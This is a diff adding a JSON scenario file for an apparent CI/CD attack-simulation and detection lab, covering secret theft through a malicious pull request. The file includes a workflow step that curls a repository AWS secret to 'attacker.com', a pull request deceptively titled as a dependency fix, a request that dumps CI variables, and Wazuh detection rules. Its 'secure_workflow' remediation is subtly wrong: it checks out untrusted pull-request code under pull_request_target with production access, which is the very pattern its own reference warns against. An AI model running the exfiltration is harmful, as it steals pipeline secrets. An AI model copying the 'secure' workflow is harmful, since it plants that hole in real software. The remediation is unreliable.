@@ -1,0 +1,186 @@
+{
+  "id": "S3-02",
+  "name": "Pipeline Injection via Pull Request",
+  "category": "CI/CD Pipeline",
+  "version": "1.0",
+  "description": "Inject malicious code into CI/CD pipeline via crafted pull request",
+  "difficulty": "Medium",
+  "real_world_relevance": "Codecov breach (2021), SolarWinds (build system compromise)",
+
+  "mitre_attack": {
+    "tactics": ["Execution", "Initial Access"],
+    "techniques": [
+      {"id": "T1195.002", "name": "Supply Chain Compromise: Compromise Software Supply Chain"},
+      {"id": "T1059", "name": "Command and Scripting Interpreter"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cicd-runner", "mock-cicd"],
+    "network": "cicd_net"
+  },
+
+  "attack_flow": {
+    "description": "Attacker submits PR that modifies workflow to exfiltrate secrets",
+    "diagram": [
+      "1. Attacker forks target repository",
+      "2. Attacker modifies workflow file to include malicious steps",
+      "3. Attacker submits PR to trigger workflow",
+      "4. Malicious workflow executes with repository secrets",
+      "5. Secrets are exfiltrated to attacker-controlled server"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Workflow Discovery",
+      "description": "Identify workflow files and their triggers",
+      "actions": [
+        {
+          "type": "file_read",
+          "target": ".github/workflows/ci.yml",
+          "expected_contents": ["on: [push, pull_request]", "secrets."]
+        }
+      ]
+    },
+    {
+      "name": "Malicious Workflow Creation",
+      "description": "Create workflow that exfiltrates secrets",
+      "actions": [
+        {
+          "type": "file_write",
+          "target": ".github/workflows/ci.yml",
+          "content": "Workflow with: curl https://attacker.com/?secret=${{ secrets.AWS_KEY }}"
+        }
+      ]
+    },
+    {
+      "name": "PR Submission",
+      "description": "Submit pull request to trigger workflow",
+      "actions": [
+        {
+          "type": "command",
+          "command": "gh pr create --title 'Fix: Update dependencies' --body 'Minor update'",
+          "description": "Create innocuous-looking PR"
+        }
+      ]
+    },
+    {
+      "name": "Secret Exfiltration",
+      "description": "Workflow executes and leaks secrets",
+      "critical": true,
+      "actions": [
+        {
+          "type": "http_request",
+          "target": "http://172.42.0.100:8080/gitlab/api/v4/projects/1/variables",
+          "method": "GET",
+          "expected_response_contains": ["DEPLOY_TOKEN", "AWS_ACCESS_KEY_ID"]
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "File",
+      "description": "Modification to workflow files from untrusted source",
+      "wazuh_rule": "100803"
+    },
+    {
+      "type": "Network",
+      "description": "Outbound requests during CI execution to unknown hosts",
+      "wazuh_rule": "100804"
+    },
+    {
+      "type": "Process",
+      "description": "curl/wget with secrets in URL or body",
+      "wazuh_rule": "100805"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100803",
+      "level": 10,
+      "description": "NHI: CI/CD workflow file modification detected"
+    },
+    {
+      "rule_id": "100804",
+      "level": 12,
+      "description": "NHI: Suspicious outbound request during CI execution"
+    },
+    {
+      "rule_id": "100805",
+      "level": 14,
+      "description": "NHI: Secret exfiltration attempt in CI pipeline"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Block malicious PR and close",
+      "Rotate all secrets that may have been exposed",
+      "Review CI logs for unauthorized access"
+    ],
+    "long_term": [
+      "Require workflow approval for PRs from forks",
+      "Use pull_request_target carefully with explicit checkout",
+      "Implement branch protection rules",
+      "Enable secret scanning on workflow changes"
+    ],
+    "secure_workflow": {
+      "name": "Secure CI",
+      "on": {
+        "pull_request_target": {
+          "types": ["opened", "synchronize"]
+        }
+      },
+      "permissions": {
+        "contents": "read",
+        "pull-requests": "read"
+      },
+      "jobs": {
+        "build": {
+          "runs-on": "ubuntu-latest",
+          "environment": "production",
+          "steps": [
+            {
+              "name": "Checkout PR",
+              "uses": "actions/checkout@v4",
+              "with": {
+                "ref": "${{ github.event.pull_request.head.sha }}",
+                "persist-credentials": false
+              }
+            }
+          ]
+        }
+      }
+    }
+  },
+
+  "demo_script": {
+    "container": "cicd-runner",
+    "commands": [
+      "# Show malicious workflow example",
+      "cat /opt/demo/malicious-workflow.yml",
+      "",
+      "# Access CI/CD variables",
+      "curl http://mock-cicd:8080/gitlab/api/v4/projects/1/variables"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "GitHub Actions Security - pull_request_target",
+      "url": "https://securitylab.github.com/research/github-actions-preventing-pwn-requests/"
+    },
+    {
+      "title": "Codecov Supply Chain Attack",
+      "url": "https://about.codecov.io/security-update/"
+    },
+    {
+      "title": "MITRE ATT&CK T1195.002",
+      "url": "https://attack.mitre.org/techniques/T1195/002/"
+    }
+  ]
+}
